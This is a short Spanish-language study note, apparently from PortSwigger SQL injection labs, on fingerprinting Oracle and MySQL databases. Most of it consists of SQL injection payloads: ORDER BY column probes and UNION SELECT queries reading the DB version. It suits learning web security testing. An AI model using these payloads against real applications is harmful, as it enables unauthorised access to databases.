# Identificar versión y motor de DB Oracle, MySQL y MSSQL 

Tags: #SQLi #PortSwigger #Oracle #MySQL #MSSQL #BurpSuite 


* [SQLi Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Conocer el numero de columnas 

```bash 
❯ input ' order by 2 -- -         # Conocer el número de columnas en la web, cambiando el valor hasta que no muestre un error o que cambie algo en la web 
```

## Ingresar valores en columnas en Oracle 

```bash 
❯ input ' union select 1,2 from dual -- -               # Ingresar los valores numericos o nulos (NULL) en cada columna, esto dependerá del número de columnas existentes 
❯ input ' union select "a",banner from v$version -- -   # Conocer la versión de la DB en Oracle     

Notas:
	1. La tabla DUAL es una tabla especial de una sola columna presente de manera predeterminada en todas las intalaciones de DB en Oracle 
```

## Ingresar valores en columnas en MySQL

```bash 
❯ input ' union select 1,2 -- -             # Ingresar los valores numericos o nulos (NULL) en cada columna, esto dependerá del número de columnas existentes 
❯ input ' union select "a",@@version -- -   # Conocer la versión de la DB en MySQL
```